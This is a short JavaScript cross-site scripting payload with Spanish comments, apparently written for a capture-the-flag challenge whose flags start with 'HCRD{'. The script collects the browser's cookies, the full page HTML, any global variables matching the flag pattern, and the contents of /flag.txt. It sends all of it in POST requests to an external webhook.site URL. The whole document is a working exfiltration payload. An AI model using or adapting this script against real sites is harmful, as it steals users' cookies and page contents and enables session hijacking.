var results = '';

// 1. Cookie y variables globales
results += 'COOKIE=' + document.cookie + '\n';
results += 'CANARIO=' + window.canario + '\n';

// 2. Buscar HCRD{} en todo el DOM
results += 'DOM=' + document.body.innerHTML + '\n';

// 3. Buscar en variables globales
for(var k in window) {
  try {
    var v = String(window[k]);
    if(v.match(/HCRD\{/)) {
      results += 'FOUND_IN_' + k + '=' + v + '\n';
    }
  } catch(e){}
}

// 4. Intentar fetch de /flag.txt desde el cliente
fetch('/flag.txt')
  .then(r => r.text())
  .then(t => {
    fetch('https://webhook.site/99aac403-e94c-483f-a34d-7688b8053be3', {
      method: 'POST',
      body: 'FLAG_TXT=' + t + '\n' + results
    });
  })
  .catch(e => {
    // Si falla, enviar lo que tenemos
    fetch('https://webhook.site/99aac403-e94c-483f-a34d-7688b8053be3', {
      method: 'POST',
      body: 'FLAG_TXT_ERROR=' + e + '\n' + results
    });
  });